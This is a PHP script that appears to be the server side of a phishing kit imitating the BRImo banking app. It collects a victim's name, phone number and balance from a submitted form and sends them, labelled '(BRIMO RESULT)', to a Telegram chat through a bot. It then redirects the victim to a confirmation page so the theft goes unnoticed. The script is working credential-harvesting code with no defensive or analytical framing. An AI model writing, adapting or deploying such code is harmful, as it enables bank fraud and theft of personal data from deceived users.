<?php
include "./tlgm.php";
session_start();
$nama = $_POST['nama'];
$nomor = $_POST['nomor'];
$saldo = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;


$message = "
(BRIMO RESULT)

• Nama : ".$nama."
• No Hp : ".$nomor."
• Saldo : ".$saldo."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location:../konf.html');
?>